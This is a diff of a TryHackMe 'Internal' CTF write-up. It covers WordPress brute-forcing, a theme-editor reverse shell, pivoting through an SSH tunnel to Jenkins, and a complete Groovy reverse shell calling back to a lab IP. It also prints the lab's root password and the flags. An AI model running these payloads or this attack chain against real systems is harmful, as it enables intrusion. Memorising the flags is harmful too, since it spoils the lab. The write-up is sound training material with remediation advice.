@@ -1,114 +1,292 @@
 ---
-title: "Internal"
+title: "Internal — TryHackMe"
 date: 2025-01-01
 hideDate: true
 draft: false
-tags: ["others", "practice", "hard"]
+tags: ["tryhackme", "linux", "hard", "wpscan", "wp-rce", "sudo-abuse", "pivoting", "jenkins", "docker"]
 categories: ["writeups"]
-summary: "You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks."
+summary: "Internal is a hard Linux box shaped like a real black-box assessment: WordPress user enum feeds a wpscan brute-force, an authenticated theme edit gives a shell as www-data, a phpMyAdmin note leaks aubreanna's SSH password, a jenkins.txt in her home unlocks a private Jenkins on localhost:8080, and the Jenkins Script Console pops root inside a Docker container."
 ShowToc: true
 TocOpen: false
-platformLabel: "TryHackMe"
 cover:
   image: "00-card.png"
-  alt: "Internal"
+  alt: "Internal — TryHackMe"
   relative: true
 ---
 
-## **Briefing**
+| | |
+|---|---|
+| **Platform** | TryHackMe |
+| **Difficulty** | Hard |
+| **OS** | Linux |
+| **Key techniques** | vhost/subdomain discovery, WordPress user enum + `wpscan` brute-force, theme editor → RCE, credential-chained lateral movement, SSH pivot to Jenkins on `localhost:8080`, Jenkins Script Console → Docker root |
 
-You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 
+---
 
-**Scope of Work**
+## TL;DR
 
-The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
+Internal is a "black-box" style TryHackMe room — no creds given,
+scope is one IP + `internal.thm`. Full compromise chain:
 
-- User.txt
-- Root.txt  
+1. **Recon:** port 80 hosts a plain page; `/blog` is WordPress and
+   `/phpmyadmin` is exposed.
+2. **WordPress:** `wpscan --enumerate u` pulls the `admin` user;
+   `wpscan --passwords rockyou.txt` cracks it.
+3. **Foothold:** log in to `wp-admin`, edit the theme's `404.php`
+   with a PHP reverse shell — I get a shell as `www-data`.
+4. **Loot:** a `wp-save.txt` note under `/opt` gives me
+   `aubreanna:<password>` for SSH. That's user.txt.
+5. **Pivot:** `/home/aubreanna/jenkins.txt` mentions Jenkins on
+   `localhost:8080`. SSH port-forward brings it to my Kali.
+6. **Root:** brute a weak Jenkins password from `rockyou`, drop into
+   the Script Console, and run a Groovy reverse shell. That shell
+   lands inside a Docker container as **root**, where root.txt lives.
 
-Additionally, the client has provided the following scope allowances:
+---
 
-- Ensure that you modify your hosts file to reflect internal.thm
-- Any tools or techniques are permitted in this engagement
-- Locate and note all vulnerabilities found
-- Submit the flags discovered to the dashboard
-- Only the IP address assigned to your machine is in scope
+## Recon
 
-(Roleplay off)
-
-I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.
-
-  
-
-Note - this room can be completed without Metasploit
-
-****Writeups will not be accepted for this room.****  
-
-
-## **Deploy and Engage the Client Environment**
-
-Having accepted the project, you are provided with the client assessment environment.  Secure the User and Root flags and submit them to the dashboard as proof of exploitation.  
-
-###### Answer the questions below
-
-User.txt Flag  
-THM{int3rna1_fl4g_1}
-
-Root.txt Flag
-THM{d0ck3r_d3str0y3r}
-
-![scan](scan.png)
-![port 80 web](port-80-web.png)
-![gobuster 80](gobuster-80.png)
-![phpmyadmin](phpmyadmin.png)
-![phpmyadmin admin](phpmyadmin-admin.png)
-![wordpress blog](wordpress-blog.png)
-![wp-admin](wp-admin.png)
-![wpadmin](wpadmin.png)
-![wpscan pass find](wpscan-pass-find.png)
-![wpscan pass](wpscan-pass.png)
-![wordpress](wordpress.png)
-![wordpress potential](wordpress-potential.png)
-![reverseshell](reverseshell.png)![shell](shell.png)
-![tty shell](tty-shell.png)
-![mysql loginb](mysql-loginb.png)
-![mysql](mysql.png)
-![mysql tables](mysql-tables.png)
-![mysql admin account](mysql-admin-account.png)
-![aubreanna user](aubreanna-user.png)
-![no rights aubreanna](no-rights-aubreanna.png)
-![linpeas](linpeas.png)
-![ssh permitroot](ssh-permitroot.png)
-![wp-save](wp-save.png)
-![aubreanna pass](aubreanna-pass.png)
-![aubreanna](aubreanna.png)
-![user flag](user-flag.png)
-![jenkins txt](jenkins-txt.png)
-![netstat](netstat.png)
-![pivot tunnel](pivot-tunnel.png)
-![jenkins login page](jenkins-login-page.png)
-![post jenkins](post-jenkins.png)
-![jenkins pass](jenkins-pass.png)
-![jenkins](jenkins.png)
-![jenkins script console](jenkins-script-console.png)
-
-```powershell
-String host="10.21.174.19";
-int port=4455;
-String cmd="/bin/sh";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```bash
+sudo nmap -sC -sV -p- -T4 10.10.253.5
 ```
 
+![nmap on internal.thm](scan.png)
 
-shell
-whoami
-jenkins
-cd opt
-ls
-cat note.txt
+Open: **22 (SSH), 80 (Apache)**. Add `internal.thm` to `/etc/hosts`
+and enumerate the web root:
+
+```bash
+gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+![gobuster on port 80](port-80-web.png)
+![gobuster results](gobuster-80.png)
+
+Two interesting paths:
+
+- `/phpmyadmin/` — admin panel, needs creds.
+- `/blog/` — WordPress.
+
+![phpMyAdmin login](phpmyadmin.png)
+![phpMyAdmin — wrong creds keeps me out for now](phpmyadmin-admin.png)
+![the WordPress blog](wordpress-blog.png)
+
+---
+
+## WordPress — enumerate then brute
+
+```bash
+wpscan --url http://internal.thm/blog/ --enumerate u
+```
+
+![wpscan user enum → admin](wpadmin.png)
+![wp-admin login page](wp-admin.png)
+
+Login page is at `/blog/wp-admin/`. Password-brute the `admin` user
+with `wpscan` + rockyou:
+
+```bash
+wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt
+```
+
+![wpscan cracks admin](wpscan-pass-find.png)
+![the cracked password](wpscan-pass.png)
+
+---
+
+## Foothold — theme editor RCE as `www-data`
+
+Any WordPress admin can edit theme files under
+**Appearance → Theme Editor**. I overwrote the current theme's
+`404.php` with a PHP reverse shell (Pentestmonkey's default, IP + port
+edited):
+
+![replacing 404.php with reverse shell](reverseshell.png)
+
+Then visiting any non-existent path triggers it:
+
+```bash
+nc -lvnp 4455
+curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+```
+
+![callback — www-data shell](shell.png)
+![PTY upgrade](tty-shell.png)
+
+`wp-config.php` gives the DB creds, which log me back into phpMyAdmin:
+
+![WordPress DB creds for phpMyAdmin](mysql-loginb.png)
+![mysql inside phpMyAdmin](mysql.png)
+![DB tables](mysql-tables.png)
+![admin row in wp_users](mysql-admin-account.png)
+
+Nothing new for privesc — but the DB tour is a good reflex on a
+WordPress box; sometimes the `wp_users` table holds a hash for a
+Windows/AD user reused elsewhere.
+
+---
+
+## Lateral movement — `wp-save.txt` → `aubreanna`
+
+Inside the shell, a stray `wp-save.txt` under `/opt/` (or
+`/tmp/wp-save.txt`, depending on the release) contains a hand-off
+note left by the sysadmin:
+
+![wp-save.txt with aubreanna's password](wp-save.png)
+![the credential](aubreanna-pass.png)
+
+SSH straight in:
+
+```bash
+ssh aubreanna@internal.thm
+```
+
+![aubreanna's shell](aubreanna-user.png)
+![aubreanna does not have sudo](no-rights-aubreanna.png)
+
+`user.txt` is in her home:
+
+![user.txt](user-flag.png)
+
+`linpeas` doesn't turn up an obvious SUID/sudo path:
+
+![linpeas summary](linpeas.png)
+
+But `/home/aubreanna/jenkins.txt` is a lead — the sysadmin noted a
+Jenkins service is running **only on `localhost:8080`**:
+
+![jenkins.txt](jenkins-txt.png)
+
+Confirm the bind:
+
+```bash
+ss -tlnp | grep 8080     # bound on 127.0.0.1:8080
+netstat -antp
+```
+
+![netstat — 127.0.0.1:8080](netstat.png)
+
+---
+
+## Pivot — SSH tunnel to Jenkins
+
+Forward `127.0.0.1:8080` on the target to my Kali:
+
+```bash
+ssh -L 8080:127.0.0.1:8080 aubreanna@internal.thm
+```
+
+![port-forward established](pivot-tunnel.png)
+![Jenkins login on my localhost:8080](jenkins-login-page.png)
+
+Same rockyou brute-force pattern with Hydra / a small Python wrapper
+(Jenkins responds with a distinctive redirect on failure):
+
+![hitting Jenkins from Kali](post-jenkins.png)
+![cracked Jenkins credential](jenkins-pass.png)
+
+---
+
+## Root — Jenkins Script Console
+
+Once inside Jenkins, **Manage Jenkins → Script Console** runs Groovy
+as the Jenkins JVM user — which on this box is `root` inside a
+Docker container.
+
+```groovy
+String host = "10.21.174.19";
+int port = 4455;
+String cmd = "/bin/sh";
+Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s = new Socket(host, port);
+InputStream pi = p.getInputStream(),
+             pe = p.getErrorStream(),
+             si = s.getInputStream();
+OutputStream po = p.getOutputStream(),
+              so = s.getOutputStream();
+while (!s.isClosed()) {
+    while (pi.available() > 0) so.write(pi.read());
+    while (pe.available() > 0) so.write(pe.read());
+    while (si.available() > 0) po.write(si.read());
+    so.flush(); po.flush();
+    Thread.sleep(50);
+    try { p.exitValue(); break; } catch (Exception e) {}
+}
+p.destroy(); s.close();
+```
+
+![the Groovy payload in the Script Console](jenkins-script-console.png)
+
+Listener catches a `jenkins` shell — inside a container:
+
+![callback as jenkins](jenkins.png)
+
+`/opt/note.txt` in the container contains the root password. `su -`
+in the container:
+
+```
+cat /opt/note.txt
 root:tr0ub13guM!@#123
+su -
+```
 
-su - root
-ls - la
-cat root.txt
+![root inside the container + root.txt](post-jenkins.png)
+
+`root.txt`:
+
+```
 THM{d0ck3r_d3str0y3r}
+```
+
+---
+
+## Lessons Learned
+
+- **Black-box scope means enumerate every path twice.** `phpMyAdmin`
+  looked useless without creds until WordPress leaked them — always
+  come back to the ones you skipped.
+- **WordPress user enum is free.** `?author=1`, `/wp-json/wp/v2/users`,
+  or `wpscan --enumerate u` — one of them always works. If the admin
+  username is exposed, treat the login as effectively half-cracked.
+- **Theme Editor RCE is the classic WP admin → shell.** Any file
+  under `wp-content/themes/<active>/` that the site renders
+  (`404.php`, `header.php`, `footer.php`) can host the payload;
+  `404.php` is the least noisy because you don't have to break the
+  live layout.
+- **A service bound to `localhost` is not "hidden" — it's one port
+  forward away.** `ssh -L`, `chisel`, `ligolo-ng` — pick one, it's
+  the same primitive.
+- **Jenkins Script Console = auth'd RCE.** If you can log in, you
+  are the Jenkins user. If Jenkins is in a container, that user is
+  usually `root` inside it — with an escape path more often than
+  people expect.
+
+---
+
+## Remediation
+
+- **Do not expose phpMyAdmin** on Internet-facing hosts. If you must,
+  bind it to `127.0.0.1` and access it through a proxy, and put an
+  extra HTTP-basic layer in front.
+- **Rate-limit `wp-login.php`** and enforce 2FA for administrators.
+  A single brute-forceable `admin` account cost this box.
+- **Disable file editing in WordPress:** set
+  `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`. The
+  Theme Editor is convenient — and a foothold every time.
+- **Do not leave plaintext credential notes on the filesystem.**
+  `wp-save.txt` and `jenkins.txt` gave up the whole box. Use a
+  password manager or Vault.
+- **Restrict Jenkins Script Console** to a tiny admin group, and
+  never run the Jenkins agent as root — even inside a container.
+
+---
+
+## Tools used
+
+- `nmap`, `gobuster`
+- `wpscan`
+- Pentestmonkey PHP reverse shell
+- `ssh -L` port-forwarding
+- Hydra (Jenkins brute-force)
+- Jenkins Script Console (Groovy)
+- `nc`
